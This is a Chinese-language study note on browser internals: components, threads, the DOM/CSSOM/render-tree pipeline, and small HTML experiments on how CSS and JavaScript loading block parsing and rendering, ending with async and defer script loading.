# 浏览器端

## 浏览器原理

```
参考词汇： 
```

### 浏览器的功能

#### 1、网络

> 浏览器通过网络模块来下载各式各样的资源，例如html文本；javascript代码；样式表；图片；音视频文件等。
>
> 网络部分本质上十分重要，因为它耗时长，而且需要安全访问互联网上的资源。

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210227221121.png" alt="image-20210131141103418" style="zoom: 50%;" /> 

#### 2、资源管理

> 从网络下载，或者本地获取到的资源需要有高效的机制来管理他们。
>
> 例如：如何避免重复下载，资源如何缓存等

#### 3、网页浏览

> 这是浏览器的核心也是最基本的功能，最重要的功能。
>
> 如何将资源转变为可视化的结果。

浏览器的主要功能总结起来就是一句话：将用户输入的url转变成可视化的图像。

1、从url到DOM树

2、从DOM树到可视化图像

这两个过程之间的关系没有那么明确，我们可以统称这两个过程为页面的渲染。

### 浏览器的组成

<img src="https://images2018.cnblogs.com/blog/1426829/201806/1426829-20180626200818008-861865339.png" alt="img" style="zoom:80%;" /> 

简单来说浏览器可以分为两部分，`shell+内核`。其中shell的种类相对比较多，内核则比较少。

Shell是指浏览器的外壳：包括User Interface（用户界面）、Browser engine（浏览器引擎）、Networking（网络）、UI Backend（UI 后端）、Date Persistence（数据持久化存储）。它是调用内核来实现各种功能的。

内核才是浏览器的核心。内核是基于标记语言显示内容的程序或模块。也有一些浏览器并不区分外壳和内核。 从Mozilla将Gecko独立出来后，才有了外壳和内核的明确划分。目前主流的浏览器有IE6、IE8、Mozilla、FireFox、Opera、Safari、Chrome、Netscape等。

`浏览器内核又可以分成两部分：渲染引擎(layout engineer或者Rendering Engine)和JS引擎`。它负责取得网页的内容（HTML、XML、图像等等）、整理讯息（例如加入CSS等），以及计算网页的显示方式，然后会输出至 显示器或打印机。浏览器的内核的不同对于网页的语法解释会有不同，所以渲染的效果也不相同。所有网页浏览器、电子邮件客户端以及其它需要编辑、显示网络内 容的应用程序都需要内核。

JS引擎则是解析Javascript语言，执行javascript语言来实现网页的动态效果。最开始渲染引 擎和JS引擎并没有区分的很明确，后来JS引擎越来越独立，`内核就倾向于只指渲染引擎`。有一个网页标准计划小组制作了一个ACID来测试引擎的兼容性和性 能。内核的种类很多，如加上没什么人使用的非商业的免费内核，可能会有10多种，但是常见的浏览器内核可以分这四种：`Trident、Gecko、 Presto、Webkit。`

![img](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210228015823.png)

**相互工作：**

![img](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210228015844.png)

- 用户界面 －包括地址栏、后退/前进按钮、书签目录等，也就是你-所看到的除了页面显示窗口之外的其他部分
- 浏览器引擎 －可以在用户界面和渲染引擎之间传送指令或在客户端本地缓存中读写数据等，是浏览器中各个部分之间相互通信的核心
- 渲染引擎 －解析DOM文档和CSS规则并将内容排版到浏览器中显示有样式的界面，也有人称之为排版引擎，我们常说的浏览器内核主要指的就是渲染引擎
- 网络 －用来完成网络调用或资源下载的模块
- UI 后端 －用来绘制基本的浏览器窗口内控件，如输入框、按钮、单选按钮等，根据浏览器不同绘制的视觉效果也不同，但功能都是一样的。
- JS引擎 －用来解释执行JS脚本的模块，如 V8 引擎、JavaScriptCore
- 数据存储持久层 - 浏览器需要把所有数据存到硬盘上，如cookies、localStorage、sessionStorage。新的HTML5规范规定了一个完整（虽然轻量级）的浏览器中的数据库 web database

`注意：chrome浏览器与其他浏览器不同，chrome使用多个渲染引擎实例，每个Tab页一个，即每个Tab都是一个独立进程。`

### 浏览器中的进程与线程

Chrome浏览器使用多个进程来隔离不同的网页，在Chrome中打开一个网页相当于起了一个进程，每个tab网页都有由其独立的渲染引擎实例。因为如果非多进程的话，如果浏览器中的一个tab网页崩溃，将会导致其他被打开的网页应用。另外相对于线程，进程之间是不共享资源和地址空间的，所以不会存在太多的安全问题，而由于多个线程共享着相同的地址空间和资源，所以会存在线程之间有可能会恶意修改或者获取非授权数据等复杂的安全问题。

`同一个网站打开多个网页使用一个进程。`

在内核控制下各线程相互配合以保持同步，一个浏览器通常由以下常驻线程组成：

**1. GUI 渲染线程**

GUI渲染线程负责渲染浏览器界面HTML元素,当界面需要重绘(Repaint)或由于某种操作引发回流(reflow)时，该线程就会执行。在Javascript引擎运行脚本期间,GUI渲染线程都是处于挂起状态的，也就是说被冻结了.

**2. JavaScript引擎线程**

JS为处理页面中用户的交互，以及操作DOM树、CSS样式树来给用户呈现一份动态而丰富的交互体验和服务器逻辑的交互处理。如果JS是多线程的方式来操作这些UI DOM，则可能出现UI操作的冲突；如果JS是多线程的话，在多线程的交互下，处于UI中的DOM节点就可能成为一个临界资源，假设存在两个线程同时操作一个DOM，一个负责修改一个负责删除，那么这个时候就需要浏览器来裁决如何生效哪个线程的执行结果，当然我们可以通过锁来解决上面的问题。但为了避免因为引入了锁而带来更大的复杂性，JS在最初就选择了单线程执行。

`GUI渲染线程与JS引擎线程互斥的，是由于JavaScript是可操纵DOM的`，如果在修改这些元素属性同时渲染界面（即JavaScript线程和UI线程同时运行），那么渲染线程前后获得的元素数据就可能不一致。当JavaScript引擎执行时GUI线程会被挂起，GUI更新会被保存在一个队列中等到引擎线程空闲时立即被执行。由于GUI渲染线程与JS执行线程是互斥的关系，当浏览器在执行JS程序的时候，GUI渲染线程会被保存在一个队列中，直到JS程序执行完成，才会接着执行。因此如果JS执行的时间过长，这样就会造成页面的渲染不连贯，导致页面渲染加载阻塞的感觉。

**3. 定时触发器线程**

浏览器定时计数器并不是由JS引擎计数的, 因为JS引擎是单线程的, 如果处于阻塞线程状态就会影响记计时的准确, 因此通过单独线程来计时并触发定时是更为合理的方案。

**4. 事件触发线程**

当一个事件被触发时该线程会把事件添加到待处理队列的队尾，等待JS引擎的处理。这些事件可以是当前执行的代码块如定时任务、也可来自浏览器内核的其他线程如鼠标点击、AJAX异步请求等，但由于JS的单线程关系所有这些事件都得排队等待JS引擎处理。

**5. 异步http请求线程**

在XMLHttpRequest在连接后是通过浏览器新开一个线程请求，将检测到状态变更时，如果设置有回调函数，异步线程就产生状态变更事件放到JS引擎的处理队列中等待处理。

### 前端页面渲染流程       

用户请求的HTML文本(text/html)通过浏览器的网络层到达渲染引擎后，渲染工作开始。每次通常渲染不会超过8K的数据块，其中基础的渲染流程

图：

![640?wx_fmt=png](https://ss.csdn.net/p?https://mmbiz.qpic.cn/mmbiz_png/XP4dRIhZqqV6B9SNRbyQflzvDFfqbdftQpnTDP7u7ic6kxy3kJCsQH0lZvUOhvjyvIXpRjhicywaYMIhCk0DyZCg/640?wx_fmt=png)		

webkit引擎渲染的详细流程，其他引擎渲染流程稍有不同：

![img](https://image.fundebug.com/2019-01-03-1.png)

浏览器工作流程大体分为如下三部分：

**1）浏览器会解析三个东西：**

- 一个是HTML/SVG/XHTML，事实上，Webkit有三个C++的类对应这三类文档。解析这三种文件会产生一个DOM Tree。
- CSS，解析CSS会产生CSS规则树。
- Javascript，脚本，主要是通过DOM API和CSSOM API来操作DOM Tree和CSS Rule Tree.

**2）解析完成后，浏览器引擎会通过DOM Tree 和 CSS Rule Tree 来构造 Rendering Tree。**

- Rendering Tree 渲染树并不等同于DOM树，因为一些像Header或display:none的东西就没必要放在渲染树中了。
- CSS 的 Rule Tree主要是为了完成匹配并把CSS Rule附加上Rendering Tree上的每个Element。也就是DOM结点。也就是所谓的Frame。
- 然后，计算每个Frame（也就是每个Element）的位置，这又叫`layout`和`paint`过程。

**3）最后通过调用操作系统Native GUI的API绘制。**

> 接下来我们针对这其中所经历的重要步骤，一一详细阐述。

渲染过程:

浏览器渲染页面的整个过程：浏览器会从上到下解析文档。

1、遇见HTML标记，调用HTML解析器解析为对应的token（一个token就是一个标签文本的序列化）并构建DOM树（就是一块内存，保存

​	 着他们tokens，建立他们之间的关系）

2、遇见tyle/link标记调用解析器处理css标记并构建css样式树（CSSOM)，就算没有写css样式，也会有默认的样式，也会生成CSS树(CSSOM)。

3、遇见script标记调用javascript解析器处理script标记，绑定事件、修改DOM树/CSS树

4、将DOM树与CSS树合并成一个渲染树(这个过程并不需要等全部DOM和CSSOM生成，而是一点一点渲染，也不一定是遇到一个标签就渲染一次）

5、根据渲染树来渲染，以计算每个节点的几何信息（这一过程需要依赖图形库）

6、将各个节点绘制到屏幕上。

注：网页默认会有css样式，会生成默认的CSSOM，遇到html标签就会解析，一点一点解析，并渲染，但是现代浏览器为了优化性能，会解析到一定程度

才会渲染（重排和重绘），比如遇到<style><link><script>标签，

css样式一般建议放在头部，这是为了解析到html的时候就有加载完成的CSSOM了，如果放在底部，html标签会根据默认的CSSOM来进行渲染，但是遇	  到最后的CSS又会重新渲染，这样就可能导致一些闪屏或者性能问题。

js代码一般建议放在底部，如果放在头部(代码不做处理，比如：不加window.onload函数），js解析会阻塞html渲染，这样就会导致页面显示延迟，造	  成体验效果不好，而且也无法获取到DOM.放在底部就可以避免这个问题

详细流程是，

**1、只存在html**(style标签中的样式由html解析器进行解析，浏览器加载资源是异步的，页面style标签写的内部样式是异步解析的)

​	 URL->DNS->ip->send Request(html)->Receive Response->Receive Date -> Finsish Loading -> Parse HTML

​	 ->Recalculate Style(重新计算样式)->Layout->Update Layer Tree->Paint->Composite Layers(合成图层)

注：`浏览器渲染页面一般不会一点一点渲染，而是渲染好全部才会渲染处理，但是遇到图片，script标签，link标签等会渲染一次`,根据chrome实测，如果时内联js，那么会等所有js执行完毕才会渲染html,外联的只会阻塞js			下面的html

#### **构建DOM**

浏览器会遵守一套步骤将HTML 文件转换为 DOM 树。宏观上，可以分为几个步骤：

![img](https://image.fundebug.com/2019-01-03-2.png)

- 浏览器从磁盘或网络读取HTML的原始字节，并根据文件的指定编码（例如 UTF-8）将它们转换成字符串。

  在网络中传输的内容其实都是 0 和 1 这些字节数据。当浏览器接收到这些字节数据以后，它会将这些字节数据转换为字符串，也就是我们写的代码。

- 将字符串转换成Token，例如：`<html>`、`<body>`等。**Token中会标识出当前Token是“开始标签”或是“结束标签”亦或是“文本”等信息**。

这时候你一定会有疑问，节点与节点之间的关系如何维护？

事实上，这就是Token要标识“起始标签”和“结束标签”等标识的作用。例如“title”Token的起始标签和结束标签之间的节点肯定是属			  	  于“head”的子节点。

![img](https://image.fundebug.com/2019-01-03-3.png)

上图给出了节点之间的关系，例如：“Hello”Token位于“title”开始标签与“title”结束标签之间，表明“Hello”Token是“title”Token的子	   节点。同理“title”Token是“head”Token的子节点。

- 生成节点对象并构建DOM

  事实上，构建DOM的过程中，不是等所有Token都转换完成后再去生成节点对象，而是一边生成Token一边消耗Token来生成节点对象。换句话说，每个Token被生成后，会立刻消耗这个Token创建出节点对象。**注意：带有结束标签标识的Token不会创建节点对象。**

接下来我们举个例子，假设有段HTML文本：

```html
     <html>
     <head>
         <title>Web page parsing</title>
     </head>
     <body>
         <div>
             <h1>Web page parsing</h1>
             <p>This is an example Web page.</p>
         </div>
     </body>
     </html>
```

上面这段HTML会解析成这样：

![img](https://image.fundebug.com/2019-01-03-4.png)

#### **构建CSSOM**

DOM会捕获页面的内容，但浏览器还需要知道页面如何展示，所以需要构建CSSOM。

构建CSSOM的过程与构建DOM的过程非常相似，当浏览器接收到一段CSS，浏览器首先要做的是识别出Token，然后构建节点并生成CSSOM。

![img](https://image.fundebug.com/2019-01-03-5.png)

在这一过程中，浏览器会确定 每一个节点的样式到底是什么，并且这一过程其实是很消耗资源的。因为样式你可以自行设置给某个节点，也可以通过继承获得。在这一过程中，浏览器得递归 CSSOM 树，然后确定具体的元素到底是什么样式。

**注意：CSS匹配HTML元素是一个相当复杂和有性能问题的事情。所以，DOM树要小，CSS尽量用id和class，千万不要过渡层叠下去**。

#### **构建渲染树**

当我们生成 DOM 树和 CSSOM 树以后，就需要将这两棵树组合为渲染树。

![img](https://image.fundebug.com/2019-01-03-6.png)

在这一过程中，不是简单的将两者合并就行了。**渲染树只会包括需要显示的节点和这些节点的样式信息**，如果某个节点是 `display: none` 的，那么就不会在渲染树中显示。

#### **布局与绘制**

当浏览器生成渲染树以后，就会根据渲染树来进行布局（也可以叫做回流）。这一阶段浏览器要做的事情是要弄清楚各个节点在页面中的确切位置和大小。通常这一行为也被称为“自动重排”。

布局流程的输出是一个“盒模型”，它会精确地捕获每个元素在视口内的确切位置和尺寸，所有相对测量值都将转换为屏幕上的绝对像素。

布局完成后，浏览器会立即发出“Paint Setup”和“Paint”事件，将渲染树转换成屏幕上的像素。

> 以上我们详细介绍了浏览器工作流程中的重要步骤，接下来我们讨论几个相关的问题：

#### CSS图层

 浏览器在渲染一个页面时，会将页面分为很多个图层，图层有大有小，每个图层上有一个或多个节点。

在渲染DOM的时候，浏览器所做的工作实际上是：

​	1、获取DOM后分割为多个图层

​	2、对每个图层的节点计算样式结果		(Recalculate style -- 样式重计算)

​	3、为每个节点生成图形和位置			 （Layout -- 重排（回流））

​	4、将每个节点绘制填充到图层位图中	(paint -- 重绘)

​	5、图层作为纹理上传至GPU

​	6、组合多个图层到页面上生成最终屏幕图像	（Composite Layers -- 图层重组）

**图层创建的条件**

​	Chrome浏览器满足以下任意情况就会创建图层：
​			1、拥有具有3D变换的CSS属性(最常用)

​		例：

	          div{
	               transform:translateZ(0)
	          }
​	 2、使用加速视频解码的<video>节点

​	 3、<canvas>节点

​	 4、CSS3动画的节点

​	 5、拥有CSS加速属性的元素（will-change)

#### 问题一：渲染过程中遇到JS文件怎么处理？

JavaScript的加载、解析与执行会阻塞DOM的构建，也就是说，在构建DOM时，HTML解析器若遇到了JavaScript，那么它会暂停构建DOM，将控制权移交给JavaScript引擎，等JavaScript引擎运行完毕，浏览器再从中断的地方恢复DOM构建。

由于JavaScript有可能操作DOM和CSSOM，所以这时候DOM和CSSOM不会解析和合并

```
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
</head>
<body>
  <h3 id="test">test</h3>
  <h3>test</h3>
  <h3>test</h3>
  <script src="./external.js">
  </script>
</body>
</html>
```

external.js

```
alert('test')
```

结果：

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210227221146.png" alt="image-20210104094806625" style="zoom:80%;" />

发生了阻塞，我们可以在script标签后面加上defer或者async或者把所有js代码放进load事情触发后执行，因为window.onload是异步事件就可以避免这种情况了

```
     <script src="./external.js" defer>
       </script>
```

![image-20210104095039347](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210227221149.png)

注意：1、css的解析和js的执行是互斥的（互相排斥），css解析的时候js停止执行，js执行的时候css停止解析

​		  2、无论css阻塞，还是js阻塞，都不会阻塞浏览器加载外部资源（图片、视频、样式、脚本等）

​				原因：浏览器始终处于一种：“先把请求发出去”的工作模式，只要涉及到网络请求的内容，

​							无论是：图片、样式、脚本，都会先发送请求去获取资源，至于资源到本地之后什么时候用，

​							由浏览器自己协调。这种做法效率很高。

​		  3、webkit和firefox都进行了【预解析】这项优化。在执行js脚本时，浏览器的其他线程会预解析文档的js部分,预解析和js引擎是一起执行的，

​				预解析会比js快很多，当预解析完了，如果js中没有DOM操作，那么就继续往下解析dom

​				找出并加载

#### 问题二：为什么dom操作会影响性能？

在浏览器当中，dom的实现和ECMAScript的实现是分离的。

例如，在IE中，ECMAScrit的实现在jscript.dll中，而DOM的实现在mshtml.dll中；在Chrome中使用WebKit中的 WebCore处理DOM和渲染，但ECMAScript是在V8引擎中实现的，其他浏览器的情况类似。

因此，操作dom，就是通过js代码调用dom的接口，就相当于两个相互独立的模块发生了交互。这样，相比于在同一个模块当中互相调用，这种跨模块的调用它的性能损耗是非常高的。

把DOM和JavaScript（这里指ECMScript）各自想象为一个岛屿，它们之间用收费桥梁连接，ECMAScript每次访问DOM，都要途径这座桥，并交纳“过桥费”,访问DOM的次数越多，费用也就越高。因此，推荐的做法是尽量减少过桥的次数，努力待ECMAScript岛上。

然而，`dom操作影响性能最主要是因为它导致了浏览器的重绘（repaint）和重排（reflow）`。

但是：`现代浏览器中会有优化方法，就是把dom操作积累起来，做批量处理。`但是在有些情况下，浏览器会立即重排或重绘。比如请求如下的DOM元素布局信息：offsetTop/Left/Width/Height、scrollTop/Left/Width/Height、clientTop/Left/Width/Height、getComputedStyle()或 currentStyle。因为这些值都是动态计算的，所以浏览器需要尽快完成页面的绘制，然后计算返回值，从而打乱了重排或重绘的优化。

#### 问题三：CSS加载会造成阻塞吗？

为了完成本次测试，先来科普一下，如何利用chrome来设置下载速度

1. 打开chrome控制台(按下F12),可以看到下图，重点在我画红圈的地方

   ![img](https://pic1.zhimg.com/80/v2-00bec3ea167ad4320a7e60fa0e405978_720w.jpg)

2. 点击我画红圈的地方(No throttling),会看到下图,我们选择GPRS这个选项

   ![img](https://pic2.zhimg.com/80/v2-3b76909c0db211e6def82107ddaaabc9_720w.jpg)

3. 这样，我们对资源的下载速度上限就会被限制成20kb/s，好，那接下来就进入我们的正题

**css加载会阻塞DOM树的解析渲染吗？**

用代码说话：

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <title>css阻塞</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
      h1 {
        color: red !important
      }
    </style>
    <script>
      function h () {
        console.log(document.querySelectorAll('h1'))
      }
      setTimeout(h, 0)
    </script>
    <link href="https://cdn.bootcss.com/bootstrap/4.0.0-alpha.6/css/bootstrap.css" rel="stylesheet">
  </head>
  <body>
    <h1>这是红色的</h1>
  </body>
</html>
```

假设： css加载会阻塞DOM树解析和渲染

假设下的结果: 在bootstrap.css还没加载完之前，下面的内容不会被解析渲染。那么我们一开始看到的应该是白屏，h1不会显示出来。并且此时console.log的结果应该是一个空数组。

实际结果:如下图

![img](https://pic2.zhimg.com/v2-d27c590e677526132cc102b967cb06b9_b.jpg)



**css会阻塞DOM树解析？**

由上图我们可以看到，当bootstrap.css还没加载完成的时候，h1并没有显示，但是此时控制台输出如下

![img](https://pic1.zhimg.com/80/v2-655b4eabed2a09aaa75662cd971cb7fc_720w.jpg)



可以得知，此时DOM树至少已经解析完成到了h1那里，而此时css还没加载完成，也就说明，css并不会阻塞DOM树的解析。

**css加载会阻塞DOM树渲染？**

由上图，我们也可以看到，当css还没加载出来的时候，页面显示白屏，直到css加载完成之后，红色字体才显示出来，也就是说，下面的内容虽然解析了，但是并没有被渲染出来。所以，css加载会阻塞DOM树渲染。

**个人对这种机制的评价**

其实我觉得，这可能也是浏览器的一种优化机制。因为你加载css的时候，可能会修改下面DOM节点的样式，如果css加载不阻塞DOM树渲染的话，那么当css加载完之后，DOM树可能又得重新重绘或者回流了，这就造成了一些没有必要的损耗。所以干脆就先把DOM树的结构先解析完，把可以做的工作做完，然后等你css加载完之后，在根据最终的样式来渲染DOM树，这种做法性能方面确实会比较好一点。

**css加载会阻塞js运行吗？**

 由上面的推论，我们可以得出，css加载不会阻塞DOM树解析，但是会阻塞DOM树渲染。那么，css加载会不会阻塞js执行呢?

同样，通过代码来验证.

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <title>css阻塞</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script>
      console.log('before css')
      var startDate = new Date()
    </script>
    <link href="https://cdn.bootcss.com/bootstrap/4.0.0-alpha.6/css/bootstrap.css" rel="stylesheet">
  </head>
  <body>
    <h1>这是红色的</h1>
    <script>
      var endDate = new Date()
      console.log('after css')
      console.log('经过了' + (endDate -startDate) + 'ms')
    </script>
  </body>
</html>
```

假设: css加载会阻塞后面的js运行

预期结果: 在link后面的js代码，应该要在css加载完成后才会运行

实际结果:

![img](https://pic1.zhimg.com/v2-08c57cc17672558749803febff606468_b.jpg)



由上图我们可以看出，位于css加载语句前的那个js代码先执行了，但是位于css加载语句后面的代码迟迟没有执行，直到css加载完成后，它才执行。这也就说明了，css加载会阻塞后面的js语句的执行。详细结果看下图(css加载用了5600+ms):

![img](https://pic3.zhimg.com/80/v2-00254fb0bd3edd4f25fcc093681a2006_720w.jpg)

**结论**

由上所述，我们可以得出以下结论:

声明：只有link引入的外部css才能够产生阻塞。

1、style标签中的样式

​	（1）由html解析器进行解析

​	（2）不阻塞浏览器渲染(可能会产生“闪屏现象”)，因为这时会多开一个html解析器，所以并不需要等style标签里面的css渲染完成才往下解析

​	（3）不阻塞DOM解析

2、link引入的外部css样式（推荐使用的方式）：

​	（1）由css解析器进行解析

​	（2）阻塞浏览器渲染（可以利用这种阻塞避免“闪屏现象”）

​	（3）阻塞其后面的js语句的执行

​			原因：如果后面js的内容是获取元素的样式，例如宽高等CSS控制的属性，

​					  如果不等样式解析完毕，后面的js就获得了错误的信息

​					  由于浏览器也不知道后续js的具体内容，所以只好等前面的所有样式解析完毕后，再执行js

​					  例如：Firefox在样式表加载和解析的过程中，会禁止掉所有的脚本

​			注意：现代浏览器越发注重用户体验，对于webkit内核的浏览器而言，

​					  仅当脚本尝试访问的样式属性、或可能受尚未加载的样式表影响时，它才会禁止该脚本

​	（4）不阻塞DOM的解析：

​			原因:DOM解析和CSS解析是两个并行的线程，浏览器解析DOM生成DOM TREE，

​					解析CSS生成CSS TREE,最终组成render Tree,再渲染也页面。

​					即：DOM的解析，和CSS的解析是并行执行的，即:不阻塞DOM的解析

1. `css加载不会阻塞DOM树的解析`

2. `css加载会阻塞DOM树的渲染`

3. `css加载会阻塞后面js语句的执行`

   加载也就是在请求css文件的过程

因此，为了避免让用户看到长时间的白屏时间，我们应该尽可能的提高css加载速度，比如可以使用以下几种方法:

1. 使用CDN(因为CDN会根据你的网络状况，替你挑选最近的一个具有缓存内容的节点为你提供资源，因此可以减少加载时间)
2. 对css进行压缩(可以用很多打包工具，比如webpack,gulp等，也可以通过开启gzip压缩)
3. 合理的使用缓存(设置cache-control,expires,以及E-tag都是不错的，不过要注意一个问题，就是文件更新后，你要避免缓存而带来的影响。其中一个解决防范是在文件名字后面加一个版本号)
4. 减少http请求数，将多个css文件合并，或者是干脆直接写成内联样式(内联样式的一个缺点就是不能缓存)

**更新**

**原理解析**

那么为什么会出现上面的现象呢？我们从浏览器的渲染过程来解析下。

不用浏览器使用的内核不同，所以他们的渲染过程也是不一样的。目前主要有两个：

**webkit渲染过程**

![img](https://pic3.zhimg.com/80/v2-ddbb3012429ae454a92da09c816948de_720w.jpg)

**Gecko渲染过程**

![img](https://pic2.zhimg.com/80/v2-5030ffa6e418a4aab8f4bc5fce21fccd_720w.jpg)



从上面两个流程图我们可以看出来，浏览器渲染的流程如下：

1. HTML解析文件，生成DOM Tree，解析CSS文件生成CSSOM Tree
2. 将Dom Tree和CSSOM Tree结合，生成Render Tree(渲染树)
3. 根据Render Tree渲染绘制，将像素渲染到屏幕上。

从流程我们可以看出来

1. `DOM解析和CSS解析是两个并行的进程，所以这也解释了为什么CSS加载不会阻塞DOM的解析`。
2. `然而，由于Render Tree是依赖于DOM Tree和CSSOM Tree的，所以他必须等待到CSSOM Tree构建完成，也就是CSS资源加载完成(或者CSS资源加载失败)后，才能开始渲染。因此，CSS加载是会阻塞Dom的渲染的`。
3. `由于js可能会操作之前的Dom节点和css样式，因此浏览器会维持html中css和js的顺序。因此，样式表会在后面的js执行前先加载执行完毕。所以css会阻塞后面js的执行。`

**补充**

**DOMContentLoaded**

对于浏览器来说，页面加载主要有两个事件，一个是DOMContentLoaded，另一个是onLoad。而onLoad没什么好说的，就是等待页面的所有资源都加载完成才会触发，这些资源包括css、js、图片视频等。

而DOMContentLoaded，顾名思义，就是当页面的内容解析完成后，则触发该事件。那么，正如我们上面讨论过的，css会阻塞Dom渲染和js执行，而js会阻塞Dom解析。那么我们可以做出这样的假设

1. 当页面只存在css，或者js都在css前面，那么DomContentLoaded不需要等到css加载完毕。
2. 当页面里同时存在css和js，并且js在css后面的时候，DomContentLoaded必须等到css和js都加载完毕才触发。

我们先对第一种情况做测试：

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <title>css阻塞</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script>
      document.addEventListener('DOMContentLoaded', function() {
        console.log('DOMContentLoaded');
      })
    </script>
    <link href="https://cdn.bootcss.com/bootstrap/4.0.0-alpha.6/css/bootstrap.css" rel="stylesheet">
  </head>
  <body>
  </body>
</html>
```

实验结果如下图：

![img](https://pic4.zhimg.com/v2-1e38a6bf92f702978c2ebb4aed4c403f_b.jpg)



从动图我们可以看出来，css还未加载完，就已经触发了DOMContentLoaded事件了。因为css后面没有任何js代码。

接下来我们对第二种情况做测试，很简单，就在css后面加一行代码就行了

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <title>css阻塞</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script>
      document.addEventListener('DOMContentLoaded', function() {
        console.log('DOMContentLoaded');
      })
    </script>
    <link href="https://cdn.bootcss.com/bootstrap/4.0.0-alpha.6/css/bootstrap.css" rel="stylesheet">

    <script>
      console.log('到我了没');
    </script>
  </head>
  <body>
  </body>
</html>
```

实验结果如下图：

![img](https://pic4.zhimg.com/v2-98b79021bbe1d0a3f2d3c2aef089278f_b.jpg)

我们可以看到，只有在css加载完成后，才会触发DOMContentLoaded事件。因此，我们可以得出结论：

1. 如果页面中同时存在css和js，并且存在js在css后面，则DOMContentLoaded事件会在css加载完后才执行。
2. 其他情况下，DOMContentLoaded都不会等待css加载，并且DOMContentLoaded事件也不会等待图片、视频等其他资源加载。

`CSS本来是可以并行下载的，在什么情况下会出现阻塞加载了(在测试观察中，IE6下CSS都是阻塞加载）`

`当CSS后面跟着嵌入的JS的时候，该CSS就会出现阻塞后面资源下载的情况。而当把嵌入JS放到CSS前面，就不会出现阻塞的情况了。`

`根本原因：因为浏览器会维持html中css和js的顺序，样式表必须在嵌入的JS执行前先加载、解析完。而嵌入的JS会阻塞后面的资源加载，所以就会出现上面CSS阻塞下载的情况`。

#### 问题四：为什么把 Script 标签放在 body 结束标签之后 html 结束标签之前？

由上面我们可以得知：js代码会阻塞后续的html渲染，这有可能会导致不好的用户体验。

所以我们必须采取措施：

**之前推荐的方法：**

之前解决这个问题的方法是把`<script>` 标签放到`<body>`标签之后 ，这确保了解析到</body>之前都不会被script终端。

这个方法是有问题的: 浏览器在整个文档解析完成之前都不能下载script文件，如果文档很大的话，解析完HTML，用户依然要等待script文件下载并	  执行完成之后，才能操作这个网站。（主要是串行，先解析HTML完，再下载并执行script，速度肯定没有并行块，那么怎么并行呢？我们假设能在解析HTML一开始，就开始下载script，并且不阻断HTML的解析，是不是就并行了呢）如果你的网站在2秒之内没有响应，用户就会跑掉；

**推荐的解决方案：**

现在浏览器script标签支持 `async` 和 `defer` 属性. 应用这些属性当script被下载时，浏览器更安全而且可以并行下载（下载script并不阻断HTML解析）。

**async**

```text
<script type="text/javascript" src="path/to/script1.js" async></script>
<script type="text/javascript" src="path/to/script2.js" async></script
```

async标记的Script异步执行下载，并执行。这意味着script下载时并不阻塞HTML的解析，并且下载结束script马上执行。
异步意味着，上述代码script2可能比script1先下载完并执行完。

根据 [http://caniuse.com/#feat=script-async](https://link.zhihu.com/?target=http%3A//caniuse.com/%23feat%3Dscript-async), 90% 的浏览器支持async属性.

**defer**

```text
<script type="text/javascript" src="path/to/script1.js" defer></script>
<script type="text/javascript" src="path/to/script2.js" defer></script>
```

defer标签的script顺序执行。这种方式也不会阻断浏览器解析HTML。

跟 async不同, defer scripts在整个文档里的script都被下载完才**顺序执行**。

根据 [http://caniuse.com/#feat=script-defer](https://link.zhihu.com/?target=http%3A//caniuse.com/%23feat%3Dscript-defer), 90% 的浏览器支持这个属性. 92% 至少部分支持此属性。

**defer与async的区别**

![img](https://img2018.cnblogs.com/blog/1237064/201902/1237064-20190225103543934-1114218399.png)

当浏览器碰到 `script` 脚本的时候：

1. <script src="script.js"></script>

`没有 defer 或 async`，浏览器会立即加载并执行指定的脚本，“立即”指的是在渲染该 script 标签之下的文档元素之前，也就是说不等待后续载入的文档元素，读到就加载并执行。

2. <script async src="script.js"></script>

`有 async`，加载和渲染后续文档元素的过程将和 script.js 的加载与执行并行进行（异步）。

3. <script defer src="myscript.js"></script>

`有 defer`，加载后续文档元素的过程将和 script.js 的加载并行进行（异步），但是 script.js 的执行要在所有元素解析完成之后，`DOMContentLoaded` 事件触发之前完成。

> Load 事件触发代表页面中的 DOM，CSS，JS，图片已经全部加载完毕。DOMContentLoaded 事件触发代表初始的 HTML 被完全加载和解析，不需要等待 CSS，JS，图片加载。

**实用角度**

然后从实用角度来说呢，首先把`所有脚本都丢到 </body> 之前`是最佳实践，因为对于旧浏览器来说这是唯一的优化选择，此法可保证非脚本的其他一切元素能够以最快的速度得到加载和解析。

接着，我们来看一张图:
![img](https://img2018.cnblogs.com/blog/1237064/201902/1237064-20190225103106193-1835436522.jpg)

- 蓝色线代表网络读取，
- 红色线代表执行时间，这俩都是针对脚本的；
- 绿色线代表 HTML 解析。

此图告诉我们以下几个要点：

- `defer 和 async` 在`网络读取`（下载）这块儿是一样的，都是`异步的`（相较于 HTML 解析）
- `defer 和 async的差别在于脚本下载完之后何时执行`，显然 defer 是最接近我们对于应用脚本加载和执行的要求的
- `关于 defer，此图未尽之处在于它是按照加载顺序执行脚本的`，这一点要善加利用
- `async 则是一个乱序执行`的主，反正对它来说脚本的加载和执行是紧紧挨着的，所以不管你声明的顺序如何，`只要它加载完了就会立刻执行`
- 仔细想想，`async` 对于应用脚本的用处不大，因为它完全不考虑依赖（哪怕是最低级的顺序执行），不过它对于那些可以`不依赖任何脚本或不被任何脚本依赖的脚本`来说却是非常合适的，最典型的例子：`Google Analytics`

**总结**
		**1、如果嵌入JS放在head中，请把嵌入JS放在CSS头部。**
		**2、使用defer（只支持IE）anysc W3C**
		**3、不要在嵌入的JS中调用运行时间较长的函数，如果一定要用，可以用`setTimeout`来调用**

